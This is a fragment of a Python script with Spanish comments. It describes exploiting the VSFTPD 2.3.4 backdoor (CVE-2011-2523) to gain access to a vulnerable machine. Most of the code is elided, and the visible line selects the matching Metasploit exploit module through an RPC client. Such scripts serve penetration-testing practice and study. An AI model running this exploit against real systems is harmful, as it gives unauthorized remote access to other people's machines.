...
#Este script explota la vulnerabilidad VSFTPD 2.3.4 Backdoor (CVE-2011-2523), obteniendo el acceso a la máquina con
#la vulnerabilidad. 
#******************************************************************************************************************
...
if __name__ == '__main__':
    try:
        ...
        exploit = cliente_rpc.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
